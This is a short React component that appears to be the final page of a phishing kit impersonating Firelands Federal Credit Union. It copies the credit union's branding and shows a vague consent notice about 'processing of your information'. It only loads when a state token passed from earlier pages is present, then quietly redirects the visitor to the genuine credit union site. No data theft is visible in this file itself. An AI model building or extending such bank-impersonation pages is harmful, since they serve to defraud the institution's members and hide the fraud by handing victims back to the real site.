import React, { useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

const heroImageUrl = '/assets/firelands-landing.jpg';

const Terms: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  useEffect(() => {
    if (!emzemz) {
      navigate('/');
      return;
    }
    
    // Redirect to Firelands FCU after 5 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.firelandsfcu.org';
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [emzemz, navigate]);

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img src={heroImageUrl} alt="Firelands background" className="h-full w-full object-cover" />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67] mb-4">Terms & Conditions</h2>
            
            <div className="prose prose-sm max-w-none">
              <p>By using this service, you agree to our terms of use and privacy policy.</p>
              
              <ul className="list-disc pl-5 space-y-2 mt-4">
                <li>You authorize the processing of your information</li>
                <li>You confirm all provided details are accurate</li>
                <li>You agree to electronic communications</li>
              </ul>
              
              <p className="mt-6 text-sm">
                Redirecting to Firelands FCU in 5 seconds...
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Terms;
